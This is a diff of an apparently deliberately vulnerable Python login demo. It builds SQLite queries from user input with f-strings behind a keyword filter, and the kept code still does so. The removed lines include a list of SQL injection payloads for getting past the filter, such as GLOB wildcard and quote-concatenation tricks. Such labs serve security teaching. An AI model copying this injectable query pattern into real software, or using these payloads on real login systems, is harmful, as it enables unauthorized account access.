@@ -21,43 +21,6 @@ def validate_input(input_str: str, filter_keywords: list) -> bool:
         return False
     return True
 
-def vulnerable_login(username: str, password: str) -> list:
-    connection = None
-    
-    try:
-        if not validate_input(username, filter_keywords):
-            print("Username contains forbidden keywords!")
-            return []
-        
-        if not validate_input(password, filter_keywords):
-            print("Password contains forbidden keywords!")
-            return []
-        
-        connection = sqlite3.connect("vulnerable.db")
-        cursor = connection.cursor()
-        
-        query = f"""
-            SELECT users.username, roles.name AS role
-            FROM users
-            JOIN user_roles ON users.username = user_roles.user_username
-            JOIN roles ON roles.name = user_roles.role_name
-            WHERE users.username = '{username}' AND users.password = '{password}'
-        """
-        
-        print(f"Executing query: {query}")
-        
-        cursor.execute(query)
-        results = cursor.fetchall()
-        return results
-    
-    except sqlite3.Error as e:
-        print(f"Database error: {e}")
-        return []
-    finally:
-        if connection:
-            connection.close()
-
-
 def create_vulnerable_database():
     connection = sqlite3.connect("vulnerable.db")
     cursor = connection.cursor()
@@ -145,9 +108,8 @@ class UserManager:
     def __setitem__(self, username: str, user: UserProfile) -> Optional[UserProfile]:
         for i, u in enumerate(self.users):
             if u.username == username:
-                self.users[i] = user  # Update existing user
+                self.users[i] = user
                 return user
-        # If not found, append a new user
         self.users.append(user)
         return user
 
@@ -161,20 +123,6 @@ class UserManager:
             user.add_role(role)
         print(f"Created user: {user}")
         return user
-
-    def login(self, username: str, password: str) -> Optional[UserProfile]:
-        for user in self.users:
-            if user.username == username:
-                try:
-                    verify_hash(password, user.salt, user.password_hash)
-                    print(f"Login successful for user: {user}")
-                    return user
-                except InvalidKey as e:
-                    break
-                except Exception as e:
-                    print(f"Error during login: {e}")
-        print("Login failed.")
-        return None
 
     def execute_admin_task(self, user: UserProfile, task: str):
         if user.check_admin_access():
@@ -260,7 +208,6 @@ class Worker:
             print("Password contains forbidden keywords!")
             return []
 
-        print("Password:", password)
         cursor = self.conn.cursor()
 
         query = f"""
@@ -269,16 +216,12 @@ class Worker:
             WHERE users.username = '{username}' AND users.password = '{password}'
         """
         
-        print(f"Executing query: {query}")
-        
         cursor.execute(query)
         result = cursor.fetchone()
         if result is not None:
             user = self.get_user_by_username(result[0])
             return user
         
-
-        print(username)
         user = self.get_user_by_username(username)
         if user is not None:
             password = hash_pass(password, user.salt)
@@ -293,94 +236,3 @@ class Worker:
                 user = self.get_user_by_username(result[0])
                 return user
         return None
-
-
-# Simulate the application
-def main():
-    # purge db
-    if os.path.exists("vulnerable.db"):
-        os.remove("vulnerable.db")
-
-    create_vulnerable_database()
-    user_manager = UserManager()
-    worker = Worker(threading.Lock(), user_manager, sqlite3.connect("vulnerable.db"))
-
-    # Create normal users and admins
-    alice = worker.create_user("alice", "password123")
-
-    print(alice.roles)
-    admin_bob = worker.create_user("bob", "password123", ["admin"])
-    print(admin_bob.roles)
-
-    # Alice escalates privileges using shared mutable roles
-    print(alice.roles)
-    user_manager.login("alice", "password123")
-
-    charlie = worker.create_user("charlie", "password123")
-
-    print(user_manager.users)
-    print(charlie.roles)
-
-    # Verify the DB content directly
-    conn = sqlite3.connect("vulnerable.db")
-    cursor = conn.cursor()
-    cursor.execute("SELECT * FROM users")
-    print("Users in DB:", cursor.fetchall())
-    cursor.execute("SELECT * FROM roles")
-    print("Roles in DB:", cursor.fetchall())
-    cursor.execute("SELECT * FROM user_roles")
-    print("User Roles in DB:", cursor.fetchall())
-    demonstrate_sqli(worker)
-
-    conn.close()
-
-def demonstrate_sqli(worker):
-    """Demonstrate SQL injection techniques with keyword filtering"""
-    # Create the vulnerable database first
-    #create_vulnerable_database()
-    
-    print("SQL Injection Demonstration:\n")
-    
-    # Injection attempts that try to bypass keyword filtering
-    injection_attempts = [
-        # THIS CAN'T WORK BECAUSE OF THE FILTER KEYWORDS
-        # 1. Classic Authentication Bypass
-        {"username": "admin'--", "password": "anything"},
-        
-        # 2. Complex Bypass using OR
-        {"username": "admin' OR '1'='1", "password": "anything' OR '1'='1"},
-
-        # 3. Bypassing 'admin' filter
-        {"username": "adm1n", "password": "anything"},
-        
-        # 4. Alternative concatenation
-        {"username": "administrator", "password": "'||'"},
-        
-        # 7. Attempting to break filter with unusual characters
-        {"username": "a' GLOB '*", "password": "a' GLOB '*"}, # Só esta é que passa
-
-        {"username": "adm'||'in", "password": "' glob '*"},
-
-        {"username": "alice'='alice", "password": "alice"},
-        {"username": "alice", "password": "password123"}, # Login real para ver se o login funciona
-    ]
-    
-    print("Attempting Injections:\n")
-    for attempt in injection_attempts:
-        print(f"Username: {attempt['username']}")
-        print(f"Password: {attempt['password']}")
-        
-        results = worker.login_user(attempt['username'], attempt['password'])
-        
-        if results:
-            print("Successful injection! Retrieved users:")
-            
-            print(f"Username: {results.username}, Role: {results.roles}")
-        else:
-            print("Injection attempt failed")
-        print("\n" + "-"*40 + "\n")
-
-if __name__ == "__main__":
-    main()
-
-    
